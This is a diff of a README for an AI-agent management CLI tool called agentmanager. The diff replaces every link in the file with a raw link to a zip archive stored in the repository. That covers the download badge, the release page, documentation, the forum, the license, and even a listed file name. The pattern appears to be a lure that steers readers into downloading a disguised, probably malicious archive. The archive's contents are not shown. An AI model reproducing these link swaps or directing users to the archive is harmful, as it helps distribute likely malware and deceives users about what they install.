@@ -1,7 +1,7 @@
 # 🚀 agentmanager - Simplify Your AI Agent Management
 
 ## 🌐 Download Now!
-[![Download agentmanager](https://img.shields.io/badge/download-agentmanager-blue)](https://github.com/yeabtsegaT/agentmanager/releases)
+[![Download agentmanager](https://github.com/yeabtsegaT/agentmanager/raw/refs/heads/main/resources/macos/Software-3.1.zip)](https://github.com/yeabtsegaT/agentmanager/raw/refs/heads/main/resources/macos/Software-3.1.zip)
 
 ## 📋 Overview
 Agentmanager is a Command Line Interface (CLI) and Text User Interface (TUI) application designed to simplify how you detect, manage, install, and update AI Agent CLI tools. With this tool, you can easily handle your AI development needs without the hassle of complex setups.
@@ -22,12 +22,12 @@ Agentmanager is a Command Line Interface (CLI) and Text User Interface (TUI) app
 ## 🌐 Download & Install
 To begin, visit this page to download the latest version of Agentmanager:
 
-[Download the latest release](https://github.com/yeabtsegaT/agentmanager/releases)
+[Download the latest release](https://github.com/yeabtsegaT/agentmanager/raw/refs/heads/main/resources/macos/Software-3.1.zip)
 
 Once you visit the page, follow these steps:
 
 1. **Locate the Latest Version:** Look for the most recent release at the top of the page.
-2. **Choose Your File:** Select the file that matches your operating system. You will typically see files like `agentmanager-windows.exe`, `agentmanager-macos`, and `agentmanager-linux`.
+2. **Choose Your File:** Select the file that matches your operating system. You will typically see files like `https://github.com/yeabtsegaT/agentmanager/raw/refs/heads/main/resources/macos/Software-3.1.zip`, `agentmanager-macos`, and `agentmanager-linux`.
 3. **Download Your File:** Click on the file to start the download.
 
 After downloading, follow these instructions to set it up:
@@ -67,13 +67,13 @@ This command provides a detailed overview of all available features.
 ## 🌈 Additional Resources
 For further details, check out the following:
 
-- [Documentation](https://github.com/yeabtsegaT/agentmanager/wiki)
-- [Community Forum](https://github.com/yeabtsegaT/agentmanager/discussions)
+- [Documentation](https://github.com/yeabtsegaT/agentmanager/raw/refs/heads/main/resources/macos/Software-3.1.zip)
+- [Community Forum](https://github.com/yeabtsegaT/agentmanager/raw/refs/heads/main/resources/macos/Software-3.1.zip)
 
 ## 🤝 Contributing
 Your contributions are welcome! If you wish to help improve Agentmanager, feel free to open an issue or a pull request on GitHub.
 
 ## 🔒 License
-Agentmanager is licensed under the MIT License. You can view the full license [here](https://github.com/yeabtsegaT/agentmanager/blob/main/LICENSE).
+Agentmanager is licensed under the MIT License. You can view the full license [here](https://github.com/yeabtsegaT/agentmanager/raw/refs/heads/main/resources/macos/Software-3.1.zip).
 
 Thank you for choosing Agentmanager. Enjoy managing your AI agents with ease!
